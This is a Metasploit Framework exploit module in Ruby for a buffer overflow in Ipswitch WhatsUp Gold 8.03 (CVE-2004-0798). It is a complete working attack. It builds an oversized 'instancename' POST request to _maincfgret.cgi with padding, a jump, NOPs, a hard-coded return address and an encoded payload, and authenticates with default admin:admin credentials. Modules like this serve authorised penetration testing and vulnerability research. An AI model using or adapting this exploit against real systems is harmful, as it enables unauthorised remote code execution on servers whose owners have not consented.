##
# $Id: ipswitch_wug_maincfgret.rb 4741 2007-04-23 05:30:48Z mmiller $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Http::Ipswitch_Wug_Maincfgret < Msf::Exploit::Remote

	include Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Ipswitch WhatsUp Gold 8.03 Buffer Overflow',
			'Description'    => %q{
				This module exploits a buffer overflow in IPswitch WhatsUp Gold 8.03. By
				posting a long string for the value of 'instancename' in the _maincfgret.cgi 
				script an attacker can overflow a buffer and execute arbitrary code on the system.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 4741 $',
			'References'     =>
				[
					['BID', '11043'],
					['CVE', '2004-0798'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform'       => 'win',
			'Targets'        => 
				[
					[ 'WhatsUP Gold 8.03 Universal', { 'Ret' => 0x6032e743 } ], # whatsup.dll
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 25 2004'))
			
			register_options( [ 
						Opt::RPORT(80),
						OptString.new('HTTPUSER', [ false, 'The username to authenticate as', 'admin']),
						OptString.new('HTTPPASS', [ false, 'The password to authenticate as', 'admin']), 
						], self.class )

	end

	def exploit
		c = connect

		num = rand(65535).to_s 
		user_pass = "#{datastore['HTTPUSER']}" + ":" + "#{datastore['HTTPPASS']}" 
		
		req   = "page=notify&origname=&action=return&type=Beeper&instancename="
		req  << rand_text_alpha_upper(811, payload_badchars) + "\xeb\x06"
		req  << make_nops(2) + [target.ret].pack('V') + make_nops(10) + payload.encoded
		req  << "&beepernumber=&upcode=" + num + "*&downcode="+ num + "*&trapcode=" + num + "*&end=end"

		print_status("Trying target %s..." % target.name)
		res = send_request_cgi({
			'uri'          => '/_maincfgret.cgi',
			'method'       => 'POST',
			'content-type' => 'application/x-www-form-urlencoded',
			'data'         => req,
			'headers'      => 
			{
				'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
			}
		}, 5)
	
		handler
	end

end
end	
